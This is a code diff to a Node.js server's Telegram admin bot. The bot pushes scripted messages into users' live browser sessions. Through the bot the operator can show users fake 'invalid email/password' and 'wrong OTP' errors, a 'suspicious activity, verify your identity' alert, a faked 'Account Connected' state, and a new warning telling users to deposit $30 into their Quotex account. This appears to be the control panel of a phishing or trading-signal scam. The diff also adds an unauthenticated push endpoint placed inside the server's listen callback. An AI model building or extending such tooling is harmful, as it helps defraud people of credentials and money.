@@ -281,8 +281,11 @@ function tgMainMenuKeyboard() {
     return {
         inline_keyboard: [
             [{ text: '👥 Online Users', callback_data: 'online' }, { text: '📊 Stats', callback_data: 'stats' }],
-            [{ text: '📢 Broadcast to ALL', callback_data: 'broadcast' }],
-            [{ text: '❓ Help / Commands', callback_data: 'help' }],
+            [{ text: '📢 Broadcast to ALL', callback_data: 'broadcast' }, { text: '🔔 Push Notify', callback_data: 'push_all' }],
+            [{ text: '🔗 Trigger Connected', callback_data: 'ask_trigger_connected' }, { text: '💰 Low Balance', callback_data: 'ask_low_balance' }],
+            [{ text: '🎯 Manage User', callback_data: 'ask_user' }, { text: '🔑 Licenses', callback_data: 'licenses' }],
+            [{ text: '🛒 Orders', callback_data: 'orders' }, { text: '🛠 Maintenance', callback_data: 'maint_menu' }],
+            [{ text: '⚙️ Bot Settings', callback_data: 'settings_view' }, { text: '❓ Help', callback_data: 'help' }],
         ],
     };
 }
@@ -291,6 +294,14 @@ function tgUserActionKeyboard(userName) {
     const u = encodeURIComponent(userName);
     return {
         inline_keyboard: [
+            [
+                { text: '🔗 Trigger Connected', callback_data: `trigger_connected|${u}` },
+                { text: '🔔 Push Notify',       callback_data: `ask_push|${u}` },
+            ],
+            [
+                { text: '💰 Low Balance Warn', callback_data: `qt|low_balance|${u}` },
+                { text: '💵 Inject Balance',   callback_data: `ask_balance|${u}` },
+            ],
             [
                 { text: '⚠️ Invalid Email/Password', callback_data: `qt|invalid_login|${u}` },
                 { text: '🔢 Wrong OTP',              callback_data: `qt|wrong_otp|${u}` },
@@ -308,12 +319,12 @@ function tgUserActionKeyboard(userName) {
                 { text: '⏳ Push Loading', callback_data: `push_loading|${u}` },
             ],
             [
-                { text: '💰 Inject Balance', callback_data: `ask_balance|${u}` },
-                { text: '👢 Kick User',      callback_data: `kick|${u}` },
+                { text: '👢 Kick User', callback_data: `kick|${u}` },
+                { text: '🚫 Block',     callback_data: `block|${u}` },
             ],
             [
-                { text: '🚫 Block', callback_data: `block|${u}` },
-                { text: '✅ Unblock', callback_data: `unblock|${u}` },
+                { text: '✅ Unblock',   callback_data: `unblock|${u}` },
+                { text: '🗑 Delete',    callback_data: `delete|${u}` },
             ],
             [{ text: '🔙 Main Menu', callback_data: 'menu' }],
         ],
@@ -326,6 +337,7 @@ const QUICK_TRIGGERS = {
     login_ok:      { type: 'info',        text: '✅ Login successful. Welcome back!' },
     alert:         { type: 'alert',       text: '🚨 Suspicious activity detected on your account. Please verify your identity.' },
     instruction:   { type: 'instruction', text: '📋 Please follow the on-screen instructions to continue.' },
+    low_balance:   { type: 'alert',       text: '⚠️ Dear User, You Have Low Balance in your Quotex Account. Please Deposit 30$ or Above To Continue.' },
 };
 
 async function tgInjectMessage(userName, type, text) {
@@ -431,6 +443,70 @@ async function tgHandleCallback(chatId, data, callbackId) {
             return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` });
         }
     }
+
+    // === NEW: Trigger "Account Connected" from Telegram ===
+    if (action === 'trigger_connected') {
+        sendSSEToUser(target, 'show_connected',    { userName: target });
+        sendSSEToUser(target, 'trigger_connected', { userName: target });
+        await sendTelegramMessage(`🔗 <b>Connection Triggered (via bot)</b>\n👤 User: <b>${target}</b>`);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `🔗 Triggered "Account Connected" for <b>${target}</b>` });
+    }
+    if (action === 'ask_trigger_connected') {
+        tgSessions[chatId] = { awaiting: 'trigger_connected_user' };
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: '🔗 Send the <b>username</b> to trigger "Account Connected" for.\n(Send /cancel to abort.)' });
+    }
+    if (action === 'ask_low_balance') {
+        tgSessions[chatId] = { awaiting: 'low_balance_user' };
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: '💰 Send the <b>username</b> to send Low Balance Warning to.\n(Send /cancel to abort.)' });
+    }
+    if (action === 'ask_user') {
+        tgSessions[chatId] = { awaiting: 'manage_user' };
+        return tgApi('sendMessage', { chat_id: chatId, text: '🎯 Send the username to manage.\n(Send /cancel to abort.)' });
+    }
+    // === NEW: Push notifications to user devices ===
+    if (action === 'push_all') {
+        tgSessions[chatId] = { awaiting: 'push_all_text' };
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: '🔔 Send the push notification text now.\nFormat: <code>Title | Body</code>\nExample: <code>New Signal | EUR/USD BUY now!</code>\n(Send /cancel to abort.)' });
+    }
+    if (action === 'ask_push') {
+        tgSessions[chatId] = { awaiting: 'push_user_text', target };
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `🔔 Send push notification for <b>${target}</b>.\nFormat: <code>Title | Body</code>\n(Send /cancel to abort.)` });
+    }
+    if (action === 'delete') {
+        const u = await tgFindUserByName(target);
+        if (!u || !u.licenceKey) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ User <b>${target}</b> not found.` });
+        try {
+            await axios.delete(`http://127.0.0.1:${process.env.PORT || 3000}/api/delete-user/${encodeURIComponent(u.licenceKey)}`);
+            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `🗑 Deleted user <b>${target}</b>` });
+        } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
+    }
+    if (action === 'licenses') {
+        try {
+            const list = useDatabase ? await License.find({}).limit(20).lean() : licenses.slice(0, 20);
+            if (!list.length) return tgApi('sendMessage', { chat_id: chatId, text: '🔑 No licenses yet.' });
+            const lines = list.map((l,i)=>`${i+1}. <code>${l.key}</code> — ${l.status} ${l.assignedTo?'→ '+l.assignedTo:''}`).join('\n');
+            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `🔑 <b>Licenses (${list.length})</b>\n${lines}` });
+        } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
+    }
+    if (action === 'orders') {
+        try {
+            const list = useDatabase && typeof Order !== 'undefined' ? await Order.find({}).sort({createdAt:-1}).limit(15).lean() : [];
+            if (!list.length) return tgApi('sendMessage', { chat_id: chatId, text: '🛒 No orders yet.' });
+            const lines = list.map((o,i)=>`${i+1}. <b>${o.fullName||'-'}</b> — ${o.planKey||'-'} — <i>${o.status||'New'}</i>`).join('\n');
+            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `🛒 <b>Recent Orders</b>\n${lines}` });
+        } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `🛒 No orders yet.` }); }
+    }
+    if (action === 'settings_view') {
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text:
+            `⚙️ <b>Bot Settings</b>\n` +
+            `🤖 Name: <b>${botSettings.botName || '-'}</b>\n` +
+            `📨 Telegram URL: <code>${botSettings.telegramUrl || '-'}</code>\n` +
+            `💬 WhatsApp URL: <code>${botSettings.whatsappUrl || '-'}</code>`
+        });
+    }
+    if (action === 'maint_menu') {
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: '🛠 <b>Maintenance Mode</b>\nUse the admin panel to toggle maintenance mode. Quick status:\n' + (typeof maintenanceMode!=='undefined' && maintenanceMode?.enabled ? '🔴 ENABLED' : '🟢 LIVE') });
+    }
 }
 
 async function tgCmdStats(chatId) {
@@ -494,6 +570,48 @@ async function tgHandleMessage(msg) {
         broadcastSSE('broadcast_message', { message: text, type: 'info', timestamp: new Date().toISOString() });
         return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `📢 Broadcast sent to <b>${sseClients.size}</b> clients.` });
     }
+    if (sess?.awaiting === 'trigger_connected_user') {
+        delete tgSessions[chatId];
+        const u = text.replace(/^@/, '');
+        sendSSEToUser(u, 'show_connected',    { userName: u });
+        sendSSEToUser(u, 'trigger_connected', { userName: u });
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `🔗 Triggered "Account Connected" for <b>${u}</b>` });
+    }
+    if (sess?.awaiting === 'low_balance_user') {
+        delete tgSessions[chatId];
+        const u = text.replace(/^@/, '');
+        const trig = QUICK_TRIGGERS.low_balance;
+        await tgInjectMessage(u, trig.type, trig.text);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `💰 Low Balance Warning sent to <b>${u}</b>` });
+    }
+    if (sess?.awaiting === 'manage_user') {
+        delete tgSessions[chatId];
+        const target = text.replace(/^@/, '');
+        const isOnline = sseUserClients.has(target.toLowerCase());
+        const found = await tgFindUserByName(target);
+        const status =
+            `👤 <b>${target}</b>\n` +
+            `🟢 Online: <b>${isOnline ? 'Yes' : 'No'}</b>\n` +
+            (found ? `🔑 Key: <code>${found.licenceKey || '-'}</code>\n📊 Status: <b>${found.status || '-'}</b>\n🚫 Blocked: <b>${found.blocked ? 'Yes' : 'No'}</b>` : `ℹ️ No DB record yet (live session only).`);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: status, reply_markup: tgUserActionKeyboard(target) });
+    }
+    if (sess?.awaiting === 'push_all_text') {
+        delete tgSessions[chatId];
+        const [titleRaw, ...bodyParts] = text.split('|');
+        const title = (titleRaw || 'Notification').trim();
+        const body  = (bodyParts.join('|') || titleRaw).trim();
+        broadcastSSE('push_notification', { title, body, target: 'all', timestamp: new Date().toISOString() });
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `🔔 Push notification sent to <b>${sseClients.size}</b> device(s).` });
+    }
+    if (sess?.awaiting === 'push_user_text' && sess.target) {
+        const t = sess.target;
+        delete tgSessions[chatId];
+        const [titleRaw, ...bodyParts] = text.split('|');
+        const title = (titleRaw || 'Notification').trim();
+        const body  = (bodyParts.join('|') || titleRaw).trim();
+        const ok = sendSSEToUser(t, 'push_notification', { title, body, target: t, timestamp: new Date().toISOString() });
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: ok ? `🔔 Push sent to <b>${t}</b>` : `⚠️ <b>${t}</b> is not online.` });
+    }
 
     // Commands
     if (text === '/start' || text === '/menu') {
@@ -505,10 +623,17 @@ async function tgHandleMessage(msg) {
     if (text === '/help') {
         return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text:
             '<b>Commands</b>\n' +
-            '/menu — main menu\n' +
-            '/online — online users\n' +
+            '/menu — main menu (all features as buttons)\n' +
+            '/online — list online users\n' +
             '/stats — bot statistics\n' +
+            '/licenses — list licenses\n' +
+            '/orders — recent orders\n' +
+            '/settings — view bot settings\n' +
             '/broadcast &lt;text&gt; — message all online users\n' +
+            '/push &lt;Title&gt; | &lt;Body&gt; — push notify ALL devices\n' +
+            '/pushto &lt;user&gt; | &lt;Title&gt; | &lt;Body&gt; — push notify one user\n' +
+            '/trigger &lt;user&gt; — trigger "Account Connected"\n' +
+            '/lowbalance &lt;user&gt; — send Low Balance Warning\n' +
             '/cancel — abort current input\n\n' +
             'Or send any <b>username</b> to open quick actions for that user.' });
     }
@@ -517,6 +642,39 @@ async function tgHandleMessage(msg) {
         if (!m) return tgApi('sendMessage', { chat_id: chatId, text: 'Usage: /broadcast Your message here' });
         broadcastSSE('broadcast_message', { message: m, type: 'info', timestamp: new Date().toISOString() });
         return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `📢 Broadcast sent to <b>${sseClients.size}</b> clients.` });
+    }
+    if (text === '/licenses') return tgHandleCallback(chatId, 'licenses', null);
+    if (text === '/orders')   return tgHandleCallback(chatId, 'orders', null);
+    if (text === '/settings') return tgHandleCallback(chatId, 'settings_view', null);
+    if (text.startsWith('/push ')) {
+        const payload = text.slice(6).trim();
+        const [titleRaw, ...bodyParts] = payload.split('|');
+        const title = (titleRaw || 'Notification').trim();
+        const body  = (bodyParts.join('|') || titleRaw).trim();
+        broadcastSSE('push_notification', { title, body, target: 'all', timestamp: new Date().toISOString() });
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `🔔 Push notification sent to <b>${sseClients.size}</b> device(s).` });
+    }
+    if (text.startsWith('/pushto ')) {
+        const payload = text.slice(8).trim();
+        const [userRaw, titleRaw, ...bodyParts] = payload.split('|').map(x => x.trim());
+        if (!userRaw || !titleRaw) return tgApi('sendMessage', { chat_id: chatId, text: 'Usage: /pushto username | Title | Body' });
+        const body = (bodyParts.join('|') || titleRaw).trim();
+        const ok = sendSSEToUser(userRaw, 'push_notification', { title: titleRaw, body, target: userRaw, timestamp: new Date().toISOString() });
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: ok ? `🔔 Push sent to <b>${userRaw}</b>` : `⚠️ <b>${userRaw}</b> is not online.` });
+    }
+    if (text.startsWith('/trigger ')) {
+        const u = text.slice(9).trim().replace(/^@/, '');
+        if (!u) return tgApi('sendMessage', { chat_id: chatId, text: 'Usage: /trigger username' });
+        sendSSEToUser(u, 'show_connected',    { userName: u });
+        sendSSEToUser(u, 'trigger_connected', { userName: u });
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `🔗 Triggered "Account Connected" for <b>${u}</b>` });
+    }
+    if (text.startsWith('/lowbalance ')) {
+        const u = text.slice(12).trim().replace(/^@/, '');
+        if (!u) return tgApi('sendMessage', { chat_id: chatId, text: 'Usage: /lowbalance username' });
+        const trig = QUICK_TRIGGERS.low_balance;
+        await tgInjectMessage(u, trig.type, trig.text);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `💰 Low Balance Warning sent to <b>${u}</b>` });
     }
 
     // Treat any other text as a username target
@@ -1532,6 +1690,27 @@ async function startServer() {
     app.listen(PORT, () => {
         console.log(`🚀 Server running on port ${PORT}`);
         console.log(`💾 Storage: ${useDatabase ? 'MongoDB Atlas (PERMANENT)' : 'File-based — set MONGODB_URI for permanent storage'}`);
+
+
+// ================== PUSH NOTIFICATION ENDPOINT ==================
+// Sends a desktop/mobile browser notification to one user or all connected users.
+// Body: { title, body, userName (optional, omit to broadcast), icon (optional) }
+app.post('/api/push-notification', async (req, res) => {
+    const { title, body, userName, icon } = req.body || {};
+    if (!title || !body) return res.status(400).json({ success: false, error: 'title and body are required' });
+    const payload = { title, body, icon: icon || '', target: userName || 'all', timestamp: new Date().toISOString() };
+    let delivered = 0;
+    if (userName) {
+        const ok = sendSSEToUser(userName, 'push_notification', payload);
+        delivered = ok ? 1 : 0;
+    } else {
+        broadcastSSE('push_notification', payload);
+        delivered = sseClients.size;
+    }
+    try { await sendTelegramMessage(`🔔 <b>Push Notification Sent</b>\n📌 Title: <b>${title}</b>\n💬 Body: ${body}\n🎯 Target: <b>${userName || 'ALL'}</b>\n📡 Delivered: <b>${delivered}</b>`); } catch(e){}
+    res.json({ success: true, delivered });
+});
+
         // Start interactive Telegram admin bot menu
         telegramPollLoop().catch(e => console.error('Telegram poll loop crashed:', e.message));
     });
